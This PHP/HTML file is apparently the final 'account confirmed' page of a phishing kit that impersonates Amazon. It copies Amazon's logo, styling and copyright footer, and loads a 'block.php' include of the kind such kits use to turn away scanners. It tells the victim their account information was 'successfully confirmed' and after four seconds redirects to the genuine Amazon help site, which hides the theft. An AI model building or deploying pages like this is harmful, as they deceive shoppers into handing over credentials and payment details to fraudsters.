<?
require_once 'block.php';

?>
<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
<html xmlns=\"http://www.w3.org/1999/xhtml\">

<head>
  <style type="text/css">
  .ap_caps_warn {
    display: none;
  }
  </style>
<link rel="icon" type="image/gif" href="content/favicon.gif">


<title>
    Amazon.com Account Confirmed
</title>
<link  type="text/css" href="content/ap-flex-reduced-nav._3C8_.css" rel="stylesheet" />

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>  



</head>

<body id="flex-reduced-nav">

<img src="content/sign-in-secure._V192194766_.gif" style="display:none;" alt=""/> 

    
<!--[if lte IE 5]>
<div class="ie">
<![endif]-->

<!--[if IE 6]>
<div class="ie ie6">
<![endif]-->

<!--[if IE 7]>
<div class="ie ie7">
<![endif]-->

<!--[if IE 8]>
<div class="ie ie8">
<![endif]-->

<div id="wrapper">
    
<div id="topSlots">
  <div id="top-1">




<table border="0" cellspacing="0" cellpadding="0" width="100%"> 
 <tbody>
  <td align="left" width="185" valign="bottom">
   <a id="navLogo" class="nonGateway" href="#">
    
     
      <span id="altLogo">
       <img src="content/amazon_logo_no-org_mid._V153387053_.png" height="30" alt="Amazon" width="100" border="0"/>
      </span>
     
     
    
   </a>
  </td>
  <td align="right" valign="top">
   <a href="login.html">Your Account</a> | 
   <a href="#">Help</a>
  </td>
 </tbody>
</table>
</div>
</div>


    
    
        <div id="centerSlots">
    


        <div id="center-0"></div>
        <div id="title-slot">



<!--[if lte IE 5]>
<div class="ie">
<![endif]-->

<!--[if IE 6]>
<div class="ie ie6">
<![endif]-->

<!--[if IE 7]>
<div class="ie ie7">
<![endif]-->  

<!--[if IE 8]>
<div class="ie ie8">
<![endif]-->  
    <div id="ap_title_pagelet">

      
      

      
    <br><br>  
    </div>
<!--[if lte IE 8]>
</div>
<![endif]-->	
	
</div>
        <div id="message-box-slot">







	
	
	

	
	
		<div id="message_warning" class="message warning" style="display:none">
		    <span></span>
		    <h6>Please Enable Cookies to Continue</h6>
		    <p>
				To continue shopping at Amazon.com, please enable cookies in your Web browser.
			</p>
			<p>
				<a href="#" target="AmazonHelp">
					Learn more
				</a>												
		    	about cookies and how to enable them.
		    </p>
		</div>
		

			<br>
		

</div>
        <div id="center-1"></div>
        <div id="signin-slot">













<!--[if lte IE 5]>
    <div class="ie">
      <![endif]-->

<!--[if IE 6]>
    <div class="ie ie6">
      <![endif]-->

<!--[if IE 7]>
    <div class="ie ie7">
      <![endif]-->

<!--[if IE 8]>
    <div class="ie ie8">
      <![endif]-->


  <div id="ap_signin1a_pagelet" class="ap_table ap_pagelet">

    
    <div id="ap_signin1a_pagelet_title" class="ap_row ap_pagelet_title">
      <h1 class="ie">Thank you
	  <img height="20" src="content/done.png" width="20"></h1>
		<h1 class="ie">You have successfully confirmed your Account information.</h1>
		<![if !IE]>
		
		<div id="ap_small_forgot_password_link_ie_old" class="ie_old">
			<div id="ap_signin1a_forgot_password_row" class="ap_row">
				<span class="ap_col1">&nbsp;</span> <span class="ap_col2">
				
				</span></div>
			<div id="ap_signin1a_cnep_row" class="ap_row">
				<span class="ap_col1">&nbsp;</span>
			</div>
			<div class="ap_row">
			</div>
		</div>
    </div>
	</div>
	<br><br><br><br>
</form>

<!--[if lte IE 8]>
    </div>
<![endif]-->
</div>
        <div id="center-3"></div>
        </div>

<div id="bottomSlots">
  <div id="bottom-5">

<div id="ap_privacy" class="ap_privacy_footer">
<p class="tiny" align="center">
<a onclick="return amz_js_PopWin('#');" target="AmazonHelp" href="#">Conditions of Use</a>
  <a onclick="return amz_js_PopWin('#');" target="AmazonHelp" href="#">Privacy Notice</a>
&copy; 1996-2020, Amazon.com, Inc. or its affiliates
</p>
</div>
</div>
</div>

<div id="javascriptSlots">



<div id="javascript-identity">











</div>

<div id="js-trms">


</div>

<!--[if lte IE 8]>
</div>
<![endif]-->

<div id='be' style="display:none;"><form name='ue_backdetect' action="get"><input type="hidden" name='ue_back' value='1' /></form></div>

</body>
</html>


<META HTTP-EQUIV="Refresh" CONTENT="4;URL=http://www.amazon.com/gp/help/customer/display.html?ie=UTF8">



